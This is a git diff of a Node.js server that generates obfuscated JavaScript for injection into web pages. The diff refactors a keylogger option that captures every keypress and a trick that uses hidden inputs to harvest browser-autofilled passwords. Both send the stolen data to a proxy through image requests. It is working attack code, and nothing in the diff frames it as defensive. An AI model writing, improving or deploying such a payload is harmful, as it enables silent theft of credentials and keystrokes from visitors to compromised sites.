@@ -958,18 +958,14 @@ MongoClient.connect(config.mongodb, function(err, db) {
 			res.setHeader('Content-Type', 'application/javascript')
 
 			let variables	= '',
-				header		= '',
 				json		= '',
 				body		= '',
 				catcher		= ''
 
 			if (keylogger) {
 				variables += 'm = {}, f = [], g = new Date().getTime(),'
-				header += comment("add listeners to the window for keydown & keyup events") + `
-					k.onkeydown = k.onkeyup = b
-				`
-				body += `
-					function b(n) {` + comment("if the key type ends with p => then it's keyup") + `
+				body += comment("add listeners to the window for keydown & keyup events") + `
+					k.onkeydown = k.onkeyup = function (n) {` + comment("if the key type ends with p => then it's keyup") + `
 						var l = '',
 							h = z = n.key,
 						if (n.type.slice(-1) == 'p') l = '_'
@@ -987,8 +983,8 @@ MongoClient.connect(config.mongodb, function(err, db) {
 					}
 
 					setInterval(function() {` + comment("if the array is empty, skip making a request") + `
-						if(!f.length) return
-						var i = {
+						if (!f.length) return
+						i = {
 							a: atob("` + btoa(req.query.project) + `"),
 							t: 1,
 							b: g,
@@ -1053,8 +1049,9 @@ MongoClient.connect(config.mongodb, function(err, db) {
 					c = ` + enc("new Image()", true) + `,
 					p = `+ enc(proxy) +`,
 					y,
+					i,
 					k = window` + variables + `
-				` + header + comment("name attribute is required for autofill to work") + `
+				` + comment("name attribute is required for autofill to work") + `
 				x.name = ""` + comment("autofill still works if the elements are non-rendered") + `
 				x.style = `+ enc("display:none") + `
 				` + comment("clone the input node instead of declaring it again") + `
@@ -1066,7 +1063,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				d.body.appendChild(w)
 				` + body + comment("add a listener to the password input, browser's autofiller will trigger this") + `
 				y.addEventListener(v, function () {` + comment("construct an object with data to extract") + `
-					var i = {
+					i = {
 						a: atob("` + btoa(req.query.project) + `"),
 						t: 0,
 						b: x.value,
